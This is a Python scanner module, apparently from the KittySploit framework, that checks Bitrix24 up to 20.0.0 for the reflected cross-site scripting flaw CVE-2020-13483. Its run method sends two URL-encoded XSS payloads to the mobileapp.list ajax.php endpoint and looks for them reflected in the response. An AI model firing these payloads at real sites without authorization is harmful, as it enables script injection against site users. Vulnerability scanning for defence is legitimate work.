#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""The Web Application Firewall in Bitrix24 up to and including 20."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Bitrix24 <=20.0.0 - Cross-Site Scripting Detection',
        'description': 'The Web Application Firewall in Bitrix24 up to and including 20.0.0 allows XSS via the items[ITEMS][ID] parameter to the components/bitrix/mobileapp.list/ajax.php/ URI.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2020', 'xss', 'bitrix', 'bitrix24', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://gist.github.com/mariuszpoplwski/ca6258cf00c723184ebd2228ba81f558',
            'https://twitter.com/brutelogic/status/1483073170827628547',
            'https://nvd.nist.gov/vuln/detail/CVE-2020-13483',
            'https://github.com/afinepl/research',
            'https://github.com/ARPSyndicate/cvemon',
        ],
        'cve': 'CVE-2020-13483',
    }

    def run(self):
        for path in ('/bitrix/components/bitrix/mobileapp.list/ajax.php/?=&AJAX_CALL=Y&items%5BITEMS%5D%5BBOTTOM%5D%5BLEFT%5D=&items%5BITEMS%5D%5BTOGGLABLE%5D=test123&=&items%5BITEMS%5D%5BID%5D=<a+href="/*">*/%29%7D%29;function+__MobileAppList()%7Balert(1)%7D//>', '/bitrix/components/bitrix/mobileapp.list/ajax.php/?=&AJAX_CALL=Y&items%5BITEMS%5D%5BBOTTOM%5D%5BLEFT%5D=&items%5BITEMS%5D%5BTOGGLABLE%5D=test123&=&items%5BITEMS%5D%5BID%5D=%3Cimg+src=%22//%0d%0a)%3B//%22%22%3E%3Cdiv%3Ex%0d%0a%7D)%3Bvar+BX+=+window.BX%3Bwindow.BX+=+function(node,+bCache)%7B%7D%3BBX.ready+=+function(handler)%7B%7D%3Bfunction+__MobileAppList(test)%7Balert(document.domain)%3B%7D%3B//%3C/div%3E'):
            r = self.http_request(method="GET", path=path, allow_redirects=False)
            if not r or r.status_code != 200:
                continue
            body = r.text or ""
            headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
            body_any = ('__MobileAppList(){alert(1)}', '__MobileAppList(test){alert(document.domain)',)
            body_all = ('mobileAppListParams', 'ajaxUrl', 'bitrix',)
            header_any = ('text/html',)
            if (any(m in body for m in body_any)) and (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
                self.set_info(
                    severity='medium',
                    reason="Bitrix24 <=20.0.0 - Cross-Site Scripting detected",
                    path=path,
                )
                return True
        return False

